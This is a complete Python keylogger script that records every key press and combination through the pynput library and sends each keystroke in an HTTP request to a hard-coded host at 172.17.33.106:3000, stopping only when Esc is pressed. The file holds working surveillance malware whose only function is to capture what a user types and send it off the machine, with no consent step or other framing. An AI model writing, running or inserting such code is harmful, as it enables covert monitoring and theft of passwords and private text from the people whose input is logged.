import requests 
import pynput
import socket
from pynput.keyboard import Key, Listener
   
def get_url(key):
    return f'http://172.17.33.106:3000/key:{key}'

keys = []
def on_press(key):
    if key not in keys:
        keys.append(key);
    try:
        if len(keys) > 1:
            s = '+'.join([str(i.char) for i in keys])
        else:
            s = key.char;
        requests.get(get_url(s))
    except AttributeError:
        if len(keys) > 1:
            s = '+'.join([str(i) for i in keys])
        else:
            s = key
        requests.get(get_url(s))
                          
def on_release(key):
    if key in keys:
        keys.remove(key)
    if key == Key.esc:
        # Stop listener
        return False
   
with Listener(on_press = on_press,
              on_release = on_release) as listener:
    listener.join()
